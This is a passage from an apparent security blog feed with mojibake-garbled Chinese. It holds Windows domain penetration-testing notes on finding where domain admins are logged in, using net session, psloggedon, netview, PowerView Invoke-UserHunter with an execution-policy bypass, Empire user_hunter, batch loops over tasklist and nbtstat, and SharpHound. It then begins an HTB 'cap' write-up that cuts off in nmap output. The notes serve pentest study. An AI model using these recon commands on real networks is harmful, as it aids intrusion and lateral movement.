id="0x06-å®šä½åŸŸç®¡ç†å‘˜"><a href="#0x06-å®šä½åŸŸç®¡ç†å‘˜" class="headerlink" title="0x06.å®šä½åŸŸç®¡ç†å‘˜"></a>0x06.å®šä½åŸŸç®¡ç†å‘˜</h2><p><code>ä¸¤ç§æ–¹æ³•:ç®¡ç†å‘˜æ—¥å¿—ä¸ç™»å…¥ä¼šè¯ï¼Œä¸»è¦æ˜¯ä¼šè¯</code></p><h3 id="01-æŸ¥çœ‹æœ¬æœºèµ„æºä½¿ç”¨æƒ…å†µ"><a href="#01-æŸ¥çœ‹æœ¬æœºèµ„æºä½¿ç”¨æƒ…å†µ" class="headerlink" title="01.æŸ¥çœ‹æœ¬æœºèµ„æºä½¿ç”¨æƒ…å†µ"></a>01.æŸ¥çœ‹æœ¬æœºèµ„æºä½¿ç”¨æƒ…å†µ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h3 id="02-psloggedon-exe"><a href="#02-psloggedon-exe" class="headerlink" title="02.psloggedon.exe"></a>02.psloggedon.exe</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe \\10.10.10.10</span><br></pre></td></tr></table></figure><blockquote><p>é€šè¿‡æ³¨å†Œè¡¨HKEY_USERSçš„keyå€¼æŸ¥è¯¢è°ç™»å…¥è¿‡</p></blockquote><p><code>å‚æ•°</code></p><table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>â€“</td><td>æ˜¾ç¤ºæ”¯æŒçš„é€‰é¡¹å’Œç”¨äºè¾“å‡ºå€¼çš„åº¦é‡å•ä½ã€‚</td></tr><tr><td>-l</td><td>ä»…æ˜¾ç¤ºæœ¬åœ°ç™»å½•ï¼Œè€Œä¸æ˜¾ç¤ºæœ¬åœ°å’Œç½‘ç»œèµ„æºç™»å½•ã€‚</td></tr><tr><td>-x</td><td>ä¸æ˜¾ç¤ºç™»å½•æ—¶é—´ã€‚</td></tr><tr><td>\\computername</td><td>æŒ‡å®šè¦ä¸ºå…¶åˆ—å‡ºç™»å½•ä¿¡æ¯çš„è®¡ç®—æœºçš„åç§°ã€‚</td></tr><tr><td>username</td><td>æŒ‡å®šç”¨æˆ·åï¼Œåœ¨ç½‘è·¯ä¸­æœç´¢è¯¥ç”¨æˆ·ç™»å…¥çš„è®¡ç®—æœº</td></tr></tbody></table><h3 id="03-PVEFindADUser-exe"><a href="#03-PVEFindADUser-exe" class="headerlink" title="03.PVEFindADUser.exe"></a>03.PVEFindADUser.exe</h3><blockquote><p>ç”¨äºæŸ¥æ‰¾æ´»åŠ¨ç›®å½•ç”¨æˆ·ç™»å½•ä½ç½®ï¼Œæšä¸¾åŸŸç”¨æˆ·ï¼ŒæŸ¥æ‰¾åœ¨ç‰¹å®šè®¡ç®—æœºä¸Šç™»å½•çš„ç”¨æˆ·ï¼ŒåŒ…æ‹¬æœ¬åœ°ç”¨æˆ·ï¼Œé€šè¿‡RDPç™»å½•çš„ç”¨æˆ·ï¼Œç”¨äºè¿è¡ŒæœåŠ¡å’Œè®¡åˆ’ä»»åŠ¡çš„ç”¨æˆ·ã€‚è¿è¡Œè¯¥å·¥å…·éœ€è¦.NET Framework2.0ç¯å¢ƒï¼Œå¹¶ä¸”å…·å¤‡ç®¡ç†å‘˜æƒé™ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADUser.exe --current</span><br></pre></td></tr></table></figure><h3 id="04-netview-exe"><a href="#04-netview-exe" class="headerlink" title="04.netview.exe"></a>04.netview.exe</h3><blockquote><p>ä½¿ç”¨WinAPIæšä¸¾ç³»ç»Ÿï¼Œåˆ©ç”¨NetSessionEnumæ‰¾å¯»ç™»å½•ä¼šè¯ï¼Œåˆ©ç”¨NetShareEnumæ‰¾å¯»å…±äº«ï¼Œåˆ©ç”¨NetWkstaUserEnumæšä¸¾ç™»å½•çš„ç”¨æˆ·ã€‚å¤§éƒ¨åˆ†åŠŸèƒ½ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚</p></blockquote><p><code>å‚æ•°</code></p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>-f filename.txt</td><td>æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ä»¥ä»ä¸­æå–ä¸»æœºåˆ—è¡¨</td></tr><tr><td>-e filename.txt**</td><td>æŒ‡å®šè¦æ’é™¤çš„ä¸»æœºåæ–‡ä»¶</td></tr><tr><td>-d domain</td><td>æŒ‡å®šè¦ä»ä¸­æ‹‰å‡ºä¸»æœºåˆ—è¡¨çš„åŸŸï¼Œå¦‚æœæœªæŒ‡å®šï¼Œåˆ™ä½¿ç”¨å½“å‰åŸŸ</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netview.exe -filenmae.txt &gt; res.txt</span><br></pre></td></tr></table></figure><h3 id="05-nmapçš„NSEè„šæœ¬"><a href="#05-nmapçš„NSEè„šæœ¬" class="headerlink" title="05.nmapçš„NSEè„šæœ¬"></a>05.nmapçš„NSEè„šæœ¬</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smb-enum-domains.nse    #å¯¹åŸŸæ§åˆ¶å™¨è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå¯ä»¥è·å–ä¸»æœºä¿¡æ¯ã€ç”¨æˆ·ã€å¯ä½¿ç”¨å¯†ç ç­–ç•¥çš„ç”¨æˆ·ç­‰</span><br><span class="line">smb-enum-groups.nse</span><br><span class="line">smb-enum-processes.nse    #è·å–ä¸»æœºè¿›ç¨‹</span><br><span class="line">smb-enum-services.nse</span><br><span class="line">smb-enum-sessions.nse    #è·å–ç”¨æˆ·ç™»å…¥ä¼šè¯</span><br><span class="line">smb-enum-shares.nse        #éå†è¿œç¨‹ä¸»æœºçš„å…±äº«ç›®å½•</span><br><span class="line">smb-enum-users.nse        #ç”¨æˆ·æƒé™ä¸å¤Ÿå¯ä»¥ä½¿ç”¨å®ƒå¯¹åŸŸæ§è¿›è¡Œæ‰«æ</span><br><span class="line">smb-flood.nse</span><br><span class="line">smb-ls.nse</span><br><span class="line">smb-mbenum.nse</span><br><span class="line">smb-os-discovery.nse    #è¿›è¡Œä¿¡æ¯æ”¶é›†</span><br></pre></td></tr></table></figure><h3 id="06-PowerViewè„šæœ¬"><a href="#06-PowerViewè„šæœ¬" class="headerlink" title="06.PowerViewè„šæœ¬"></a>06.PowerViewè„šæœ¬</h3><p><code>æ‰«æç›®æ ‡ç”¨æˆ·é›†ï¼Œä¸éœ€è¦ç®¡ç†æƒé™</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\powerview.ps1; Invoke-UserHunter&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="07-Empireçš„user-hunteræ¨¡å—"><a href="#07-Empireçš„user-hunteræ¨¡å—" class="headerlink" title="07.Empireçš„user_hunteræ¨¡å—"></a>07.Empireçš„user_hunteræ¨¡å—</h3><p><code>æŸ¥æ‰¾åŸŸç®¡ç†å‘˜ç™»å…¥çš„æœºå™¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell/situational_awareness/network/powerview/user_hunter</span><br></pre></td></tr></table></figure><h2 id="0x07-è¿›ç¨‹æŸ¥è¯¢"><a href="#0x07-è¿›ç¨‹æŸ¥è¯¢" class="headerlink" title="0x07.è¿›ç¨‹æŸ¥è¯¢"></a>0x07.è¿›ç¨‹æŸ¥è¯¢</h2><h3 id="01-netsess-exe"><a href="#01-netsess-exe" class="headerlink" title="01.netsess.exe"></a>01.netsess.exe</h3><p><code>ä¼šè¯æŸ¥è¯¢</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsess.exe -h</span><br></pre></td></tr></table></figure><h3 id="02-äº¤å‰å¼•ç”¨åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨"><a href="#02-äº¤å‰å¼•ç”¨åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨" class="headerlink" title="02.äº¤å‰å¼•ç”¨åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨"></a>02.äº¤å‰å¼•ç”¨åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨</h3><blockquote><p>åŸŸæ§æ·»åŠ åˆ°dcs.txtï¼ŒåŸŸç®¡ç†å‘˜æ·»åŠ åˆ°admins.txtï¼Œä¸netsessåœ¨åŒä¸€ç›®å½•</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; session.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type session.txt | @findstr /I %a</span><br></pre></td></tr></table></figure><h3 id="03-æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡"><a href="#03-æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡" class="headerlink" title="03.æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡"></a>03.æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡</h3><p><code>é¦–å…ˆè·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><code>å°†ç›®æ ‡ç³»ç»Ÿæ·»åŠ åˆ°ips.txtï¼ŒåŸŸç®¡ç†å‘˜æ·»åŠ åˆ°admins.txtï¼Œè¿è¡Œä»¥ä¸‹è„šæœ¬(å½“å‰è®¡ç®—æœºIP)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt;output.txt &amp;&amp; for /F %n in (admins.txt) do @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp;pause</span><br></pre></td></tr></table></figure><h3 id="04-åˆ©ç”¨NetbiosæŸ¥è¯¢ä¼šè¯"><a href="#04-åˆ©ç”¨NetbiosæŸ¥è¯¢ä¼šè¯" class="headerlink" title="04.åˆ©ç”¨NetbiosæŸ¥è¯¢ä¼šè¯"></a>04.åˆ©ç”¨NetbiosæŸ¥è¯¢ä¼šè¯</h3><blockquote><p>å°†ç›®æ ‡ç³»ç»Ÿæ·»åŠ åˆ°ips.txtï¼ŒåŸŸç®¡ç†å‘˜æ·»åŠ åˆ°admins.txtï¼Œè¿è¡Œä»¥ä¸‹è„šæœ¬</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+]Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; for /F %n in (admins.txt) do @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure><p><code>ä½¿ç”¨nbtscanè¿›è¡ŒæŸ¥è¯¢</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+]Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; for /F %n in (admins.txt) do @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure><h2 id="0x08-PowerShellæ”¶é›†åŸŸä¿¡æ¯"><a href="#0x08-PowerShellæ”¶é›†åŸŸä¿¡æ¯" class="headerlink" title="0x08.PowerShellæ”¶é›†åŸŸä¿¡æ¯"></a>0x08.PowerShellæ”¶é›†åŸŸä¿¡æ¯</h2><p><code>Powershellçš„å››ç§æƒé™</code></p><blockquote><p>Restrictedï¼šé»˜è®¤è®¾ç½®ï¼Œä¸å…è®¸æ‰§è¡Œä»»ä½•è„šæœ¬ã€‚</p><p>Allsignedï¼šåªèƒ½è¿è¡Œç»è¿‡è¯ä¹¦éªŒè¯çš„è„šæœ¬ã€‚</p><p>Unrestirctedï¼šæƒé™æœ€é«˜ï¼Œå…è®¸æ‰§è¡Œä»»ä½•è„šæœ¬ã€‚</p><p>RemoteSignedï¼šå¯¹æœ¬åœ°è„šæœ¬ä¸è¿›è¡Œé™åˆ¶ï¼Œå¯¹æ¥è‡ªç½‘ç»œçš„è„šæœ¬å¿…é¡»éªŒè¯å…¶ç­¾åã€‚</p></blockquote><h3 id="01-æƒé™ç›¸å…³"><a href="#01-æƒé™ç›¸å…³" class="headerlink" title="01.æƒé™ç›¸å…³"></a>01.æƒé™ç›¸å…³</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-ExecutionPolicy        #æŸ¥çœ‹æƒé™</span><br><span class="line">Set-ExecutionPolicy UnRestricted    #ä¿®æ”¹æƒé™</span><br></pre></td></tr></table></figure><h3 id="02-å¯¼å…¥powerview-ps1"><a href="#02-å¯¼å…¥powerview-ps1" class="headerlink" title="02.å¯¼å…¥powerview.ps1"></a>02.å¯¼å…¥powerview.ps1</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br></pre></td></tr></table></figure><h3 id="03-å¸¸ç”¨å‘½ä»¤"><a href="#03-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="03.å¸¸ç”¨å‘½ä»¤"></a>03.å¸¸ç”¨å‘½ä»¤</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PowerViewçš„å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š</span><br><span class="line">Get-NetDomainï¼šè·å–å½“å‰ç”¨æˆ·æ‰€åœ¨çš„åŸŸã€‚</span><br><span class="line">Get-NetUserï¼šè·å–æ‰€æœ‰ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetDomainControllerï¼šè·å–æ‰€æœ‰åŸŸæ§åˆ¶å™¨çš„ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetComputerï¼šè·å–åŸŸå†…æ‰€æœ‰æœºå™¨çš„è¯¦ç»†ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetOUï¼šè·å–åŸŸä¸­çš„OUä¿¡æ¯ã€‚</span><br><span class="line">Get-NetGroupï¼šè·å–æ‰€æœ‰åŸŸå†…ç»„æˆå‘˜çš„ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetFileServerï¼šæ ¹æ®SPNè·å–å½“å‰åŸŸä½¿ç”¨çš„æ–‡ä»¶æœåŠ¡å™¨ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetShareï¼šè·å–å½“å‰åŸŸå†…æ‰€æœ‰çš„ç½‘ç»œå…±äº«ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetSessionï¼šè·å–æŒ‡å®šæœåŠ¡å™¨çš„ä¼šè¯ã€‚</span><br><span class="line">Get-NetRDPSessionï¼šè·å–æŒ‡å®šæœåŠ¡å™¨çš„è¿œç¨‹è¿æ¥ã€‚</span><br><span class="line">Get-NetProcessï¼šè·å–è¿œç¨‹ä¸»æœºçš„è¿›ç¨‹ã€‚</span><br><span class="line">Get-UserEventï¼šè·å–æŒ‡å®šç”¨æˆ·çš„æ—¥å¿—ã€‚</span><br><span class="line">Get-ADObjectï¼šè·å–æ´»åŠ¨ç›®å½•çš„å¯¹è±¡ã€‚</span><br><span class="line">Get-NetGPOï¼šè·å–åŸŸå†…æ‰€æœ‰çš„ç»„ç­–ç•¥å¯¹è±¡ã€‚</span><br><span class="line">Get-DomainPolicyï¼šè·å–åŸŸé»˜è®¤ç­–ç•¥æˆ–åŸŸæ§åˆ¶å™¨ç­–ç•¥ã€‚</span><br><span class="line">Invoke-UserHunterï¼šè·å–åŸŸç”¨æˆ·ç™»å½•çš„è®¡ç®—æœºä¿¡æ¯åŠè¯¥ç”¨æˆ·æ˜¯å¦æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™ã€‚</span><br><span class="line">Invoke-ProcessHunterï¼šé€šè¿‡æŸ¥è¯¢åŸŸå†…æ‰€æœ‰çš„æœºå™¨è¿›ç¨‹æ‰¾åˆ°ç‰¹å®šç”¨æˆ·ã€‚</span><br><span class="line">Invoke-UserEventHunterï¼šæ ¹æ®ç”¨æˆ·æ—¥å¿—æŸ¥è¯¢æŸåŸŸç”¨æˆ·ç™»å½•è¿‡å“ªäº›æœºå™¨ã€‚</span><br></pre></td></tr></table></figure><h2 id="0x09-BloodHoundåŸŸå†…åˆ†æå·¥å…·"><a href="#0x09-BloodHoundåŸŸå†…åˆ†æå·¥å…·" class="headerlink" title="0x09.BloodHoundåŸŸå†…åˆ†æå·¥å…·"></a>0x09.BloodHoundåŸŸå†…åˆ†æå·¥å…·</h2><p><code>é¦–å…ˆè¿›è¡Œä¿¡æ¯é‡‡é›†ï¼Œç„¶åå¯¼å…¥åˆ†æå³å¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-å·¥ä½œç»„ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#0x01-å·¥ä½œç»„ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;0x01.å·¥ä½œç»„ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;0x01.å·¥ä½œç»„ä¿¡æ¯æ”¶é›†&lt;/h2&gt;&lt;h3 id=&quot;01-æ£€æµ‹å½“å‰shellæƒé™&quot;&gt;&lt;a href=&quot;#01-æ£€æµ‹å½“å‰shellæƒé™&quot; class=&quot;headerlink&quot; title=&quot;01.æ£€æµ‹å½“å‰shellæƒé™&quot;&gt;&lt;/a&gt;01.æ£€æµ‹å½“å‰shellæƒé™&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;whoami /user    #æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„SID&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;whoami /priv    #æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„å®‰å…¨æƒé™&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;whoami /all&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;02-æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯&quot;&gt;&lt;a href=&quot;#02-æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯&quot; class=&quot;headerlink&quot; title=&quot;02.æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯&quot;&gt;&lt;/a&gt;02.æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;systeminfo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;03-tcp-udp-ç½‘ç»œè¿æ¥çŠ¶æ€&quot;&gt;&lt;a href=&quot;#03-tcp-udp-ç½‘ç»œè¿æ¥çŠ¶æ€&quot; class=&quot;headerlink&quot; title=&quot;03.tcp/udp ç½‘ç»œè¿æ¥çŠ¶æ€&quot;&gt;&lt;/a&gt;03.tcp/udp ç½‘ç»œè¿æ¥çŠ¶æ€&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;netstat -nao&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="å†…ç½‘æ¸—é€æµ‹è¯•" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="å†…ç½‘å®‰å…¨" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[cap]</title>
    <link href="https://lunamoore.github.io/2021/07/14/HTB-cap/"/>
    <id>https://lunamoore.github.io/2021/07/14/HTB-cap/</id>
    <published>2021-07-14T06:23:37.000Z</published>
    <updated>2021-07-14T06:30:37.958Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2021/07/14/HTB-cap/image-20210714122750156.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†21ã€21ã€80ç«¯å£</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/cap]</span><br><span class="line">â””â”€# ftp anonymous@10.10.10.245                                                                                                                             1 âš™</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-14 00:34 EDT</span><br><span class="line">Nmap scan report for 10.10.10.245</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 992 closed ports</span><br><span class="line">PORT     STATE    SERVICE        VERSION</span><br><span class="line">21/tcp   open     ftp            vsftpd 3.0.3</span><br><span class="line">22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)</span><br><span class="line">|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)</span><br><span class="line">|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)</span><br><span class="line">80/tcp   open     http           gunicorn</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Content-Length: 193</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;title&gt;Bad Request&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;</span><br><span class="line">|     Invalid Request Line &amp;#x27;Invalid HTTP request line: &amp;#x27;&amp;#x27;&amp;#x27;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|     &lt;/html&gt;</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Server: gunicorn</span><br><span class="line">|     Date: Wed, 14 Jul 2021 04:39:13 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 19386</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html class=&quot;no-js&quot; lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Security Dashboard&lt;/title&gt;</span><br><span class="line">|     &lt;meta 